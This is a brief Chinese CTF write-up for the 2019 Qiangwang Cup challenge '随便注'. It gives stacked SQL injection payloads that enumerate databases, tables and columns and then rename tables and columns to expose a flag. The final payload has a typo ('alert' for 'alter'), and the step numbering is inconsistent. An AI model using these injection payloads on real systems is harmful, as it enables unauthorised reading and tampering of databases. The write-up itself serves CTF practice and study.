[强网杯 2019]随便注

这题利用的是堆叠注入,而且加来waf,过滤了一些注入语句
payload:
1.1’;show%20databases%23
2.1’;show%20tables%23
3.1’;show%20columns%20from%20words%23
4.1’;show%20columns%20from%201919810931114514%23 #不知道为啥words不用加反引号,但是那一串数字要加

1.把words表重命名为word1
2.把1919810931114514表重命名为words

4.再把words表中的flag字段重命名为data字段
5.再1’;or 1=1 #就可以了
payload:

1';rename table words to word1;rename table 1919810931114514 to words;alter table words add id int unsigned not Null auto_increment primary key; alert table words change flag data varchar(100);#
